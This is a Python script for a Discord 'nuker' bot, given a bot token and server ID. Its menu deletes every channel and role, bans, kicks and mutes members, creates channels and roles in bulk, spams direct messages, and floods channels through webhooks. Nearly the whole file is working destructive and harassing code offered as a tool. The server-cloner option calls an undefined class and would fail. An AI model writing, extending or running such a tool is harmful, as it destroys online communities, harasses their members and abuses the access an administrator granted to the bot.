from os import system
import asyncio
import colorama
from colorama import Fore, init, Style
import platform
import discord
import aiohttp

TOKEN = input("Enter the bot's token: ")
SERVER_ID = input("Enter the server ID: ")

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)

# ASCII logo
logo = """
╦ ╦┌┐┌┌┬┐┌─┐┬─┐┬ ┬┌─┐┬─┐┬  ┌┬┐
║ ║│││ ││├┤ ├┬┘││││ │├┬┘│   ││
╚═╝┘└┘─┴┘└─┘┴└─└┴┘└─┘┴└─┴─┘─┴┘
"""

# ANSI color codes
RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
RESET = "\033[0m"

@client.event
async def on_ready():
    print(f"\033[94m{logo}{RESET}")
    print(f"\033[94mBot Username: {client.user.name}")
    server = client.get_guild(int(SERVER_ID))
    print(f"Server Name: {server.name}")
    print(f"Number of Members: {server.member_count}{RESET}")

    while True:
        print(f"\n\033[94mMenu:")
        print("1. Delete Channels")
        print("2. Delete Roles")
        print("3. Ban Members")
        print("4. Kick Members")
        print("5. Mass Create Channels")
        print("6. Mass Create Roles")
        print("7. Mass Spam Messages")
        print("8. Mass Mute Members")
        print("9. Server Cloner")
        print("10. Webhook Spammer")

        choice = input(f"{YELLOW}Enter your choice: {RESET}")

        if choice == "1":
            # Delete Channels
            for channel in server.channels:
                await channel.delete()
                print(f"[+] {channel.name} deleted successfully")

        elif choice == "2":
            # Delete Roles
            for role in server.roles:
                await role.delete()
                print(f"[+] {role.name} deleted successfully")

        elif choice == "3":
            # Ban Members
            for member in server.members:
                if member != server.owner and not member.top_role >= member.guild.me.top_role:
                    await member.ban()
                    print(f"[+] {member.id} banned successfully")
                else:
                    print(f"[-] {member.id} failed to ban")

        elif choice == "4":
            # Kick Members
            for member in server.members:
                if member != server.owner and not member.top_role >= member.guild.me.top_role:
                    await member.kick()
                    print(f"[+] {member.id} kicked successfully")
                else:
                    print(f"[-] {member.id} failed to kick")

        elif choice == "5":
            # Mass Create Channels
            channel_name = input("Enter channel name: ")
            num_channels = int(input("Enter the number of channels to create: "))
            channel_type = input("Enter channel type (text/voice): ")

            for _ in range(num_channels):
                if channel_type == "text":
                    await server.create_text_channel(channel_name)
                elif channel_type == "voice":
                    await server.create_voice_channel(channel_name)

                print("[+] Channel created successfully")

        elif choice == "6":
            # Mass Create Roles
            role_name = input("Enter role name: ")
            num_roles = int(input("Enter the number of roles to create: "))
            for _ in range(num_roles):
                await server.create_role(name=role_name)
                print("[+] Role created successfully")

        elif choice == "7":
            # Mass Spam Messages
            message = input("Enter the message to spam: ")
            num_messages = int(input("Enter the number of messages to send: "))
            for member in server.members:
                if member != server.owner and not member.top_role >= member.guild.me.top_role:
                    for _ in range(num_messages):
                        await member.send(message)
                        print("[+] Message sent successfully")
                else:
                    print(f"[-] Failed to send messages to {member.id}")

        elif choice == "8":
            # Mass Mute Members
            for member in server.members:
                if member != server.owner and not member.top_role >= member.guild.me.top_role:
                    await member.edit(mute=True)
                    print(f"[+] {member.id} muted successfully")
                else:
                    print(f"[-] {member.id} failed to mute")

        elif choice == "9":
            # Server Cloner
            operating_system = platform.system()
            if operating_system == "Windows":
                system("cls")
            else:
                system("clear")
                print(chr(27) + "[2J")

            token = input('Enter your token: ')
            guild_s = input('Enter the guild ID you want to copy: ')
            guild = input('Enter the guild ID where you want to copy: ')
            input_guild_id = guild_s
            output_guild_id = guild

            print(f"Logged In as: {client.user}")
            print("Cloning Server")
            guild_from = client.get_guild(int(input_guild_id))
            guild_to = client.get_guild(int(output_guild_id))
            await Clone.guild_edit(guild_to, guild_from)
            await Clone.roles_delete(guild_to)
            await Clone.channels_delete(guild_to)
            await Clone.roles_create(guild_to, guild_from)
            await Clone.categories_create(guild_to, guild_from)
            await Clone.channels_create(guild_to, guild_from)
            await asyncio.sleep(5)
            await client.close()

        elif choice == "10":
            # Webhook Spammer
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bot {TOKEN}",
                }
                channel_id = input("Enter the ID of the channel to spam: ")
                web_name = input("Enter the webhook name: ")
                msg_amt = int(input("Enter the number of messages to send: "))
                msg = input("Enter the message to spam: ")

                try:
                    async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
                        if r.status == 429:
                            print(f"[+] Webhook created and message sent successfully")
                        else:
                            if r.status in [200, 201, 204]:
                                print(f"Created Webhook {web_name} to {channel_id}")
                                webhook_raw = await r.json()
                                webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                                async def send_message(hook, message, amount):
                                    async with aiohttp.ClientSession() as session:
                                        for i in range(amount):
                                            await session.post(hook, json={'content': message, 'tts': False})
                                            print("[+] Webhook spam message sent successfully")
                                await send_message(webhook, msg, msg_amt)

                except:
                    print(f"Failed to create webhook to {channel_id}")

        else:
            print("Invalid choice. Please try again.")

loop = asyncio.get_event_loop()
loop.run_until_complete(client.start(TOKEN))
